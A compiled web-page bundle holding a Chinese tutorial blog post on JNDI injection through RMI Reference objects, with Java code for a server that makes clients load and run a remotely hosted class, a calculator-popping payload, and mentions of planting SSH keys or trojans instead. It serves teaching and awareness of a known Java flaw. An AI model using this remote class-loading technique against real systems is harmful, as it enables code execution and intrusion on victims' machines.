import{_ as e,V as t,W as p,Y as s,Z as n,$ as c,X as o,a1 as i,F as l}from"./framework-094145d2.js";const u="/tutorial/hexblog/imgs/211216/00.jpg",r="/tutorial/hexblog/imgs/211216/01.gif",d={},k={href:"https://blog.hhui.top/hexblog/2021/12/13/211213-JDNI%E6%B3%A8%E5%85%A5%EF%BC%9ARMI%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9%E4%BB%8B%E7%BB%8D/",target:"_blank",rel:"noopener noreferrer"},m=s("p",null,"接下来我们再来看一个知识点，RMI + Reference，利用反序列化来实现注入",-1),v=i(`<h3 id="_1-reference服务端使用姿势" tabindex="-1"><a class="header-anchor" href="#_1-reference服务端使用姿势" aria-hidden="true">#</a> 1. Reference服务端使用姿势</h3><p>区别于前面一篇rmi提供的远程接口访问方式，这里借助Refernce来实现，当客户单连接请求时，返回一个Class，当客户端拿到这个class并实例化时，实现我们预期的注入</p><p>服务器的实现与前面的大体相同，通过Registry起一个rmi服务，区别在于将之前的注册一个服务类改成注册一个Reference，如下</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">8181</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;Inject&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Inject&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://127.0.0.1:9999/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ReferenceWrapper</span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
    registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">&quot;inject&quot;</span><span class="token punctuation">,</span> wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;服务已启动&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意上面的Reference的定义，三个参数</p><ul><li>className：远程加载时所使用的类名；</li><li>classFactory：加载的class中需要实例化类的名称；</li><li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li></ul><p>上面表示的是当客户端连接到这个rmi发起请求之后，会尝试从 <code>http://127.0.0.1:9999/Inject.class</code> 获取并加载class文件</p><p>接下来写一个简单的Inject类，在静态块中可以执行任何你想执行的代码</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span>  <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;hello world&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动一个简单的python服务器，这样可以直接通过网络加载这个class文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python3 http.server <span class="token parameter variable">-m</span> <span class="token number">9999</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这样一个支持代码注入的rmi服务器就搭建完成了；</p><h3 id="_2-客户端实测" tabindex="-1"><a class="header-anchor" href="#_2-客户端实测" aria-hidden="true">#</a> 2. 客户端实测</h3><p>接下来看下客户单的访问姿势</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">injectTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token comment">// 使用JDNI在命名服务中发布引用</span>
    <span class="token class-name">Hashtable</span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;rmi://127.0.0.1:8181&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">InitialContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Object</span> obj <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;rmi://127.0.0.1:8181/inject&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当jdk版本较高时，会发现有下面这种提示，表示默认不允许读取远程的class文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Exception in thread &quot;main&quot; javax.naming.NamingException [Root exception is java.lang.ClassCastException: Inject cannot be cast to javax.naming.spi.ObjectFactory]
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们先模拟一下注入的case，所以先将这个开关开上，直接在启动中添加下面这一行配置</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-Dcom.sun.jndi.rmi.object.trustURLCodebase</span><span class="token operator">=</span>true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>接下来看一下执行结果</p><figure><img src="`+u+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>重点关注上面输出的<code>hello world</code>，这个输出实际上是在Inject类的静态方法中输出的，在客户端被执行了；</p><p>接下来我们模拟一下，直接唤起客户单本地应用的case，在Inject类中，实现一个打开计算器的功能（可以借助 Runtime）</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject</span> <span class="token punctuation">{</span>
  <span class="token keyword">static</span>  <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token comment">// mac 电脑用下面这个命令</span>
      <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;open -n /Applications/Calculator.app&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// win 电脑用下面这个</span>
      <span class="token comment">// Runtime.getRuntime().exec(&quot;calc&quot;)</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来我们再来执行一下看看会发生什么，计算器是否会如期被唤起</p><figure><img src="`+r+'" alt="a.gif" tabindex="0" loading="lazy"><figcaption>a.gif</figcaption></figure><p>看到上面这个的小伙伴可能会有疑问，不过是打开我的计算器，也没啥了不起的影响，但是请注意，上面这个Inject的静态类可以任由我们自己发挥</p><ul><li>如果你的客户端是linux，那么直接在<code>~/.ssh/authorized_keys</code>中写入黑客的公钥，这样就可以直接登录服务器</li><li>直接下载木马、病毒在本机执行</li><li>....</li></ul><p>所以上面这个问题还是相当可怕的，幸好的是在Oracle JDK11.0.1, 8u191, 7u201, 6u211及之后的版本，<code>trustURLCodebase</code>这个配置默认是false，一般也不会有人特意去开启这个配置，所以问题不大</p><p>那么真的是问题不大么？且待后续博文</p>',30);function b(g,h){const a=l("ExternalLinkIcon");return t(),p("div",null,[s("p",null,[n("前面一篇介绍了基础的RMI的使用case "),s("a",k,[n("JDNI注入：RMI基本知识点介绍 - 一灰灰Blog"),c(a)]),n("，其中有说到客户端通过rmi访问server时，表现和我们常见的rpc也一致，客户端拿到代理执行的方法，也是在远程服务端执行的，怎么就存在注入问题呢?")]),m,o(" more "),v])}const x=e(d,[["render",b],["__file","211216-JDNI注入：RMI-Reference注入问题.html.vue"]]);export{x as default};
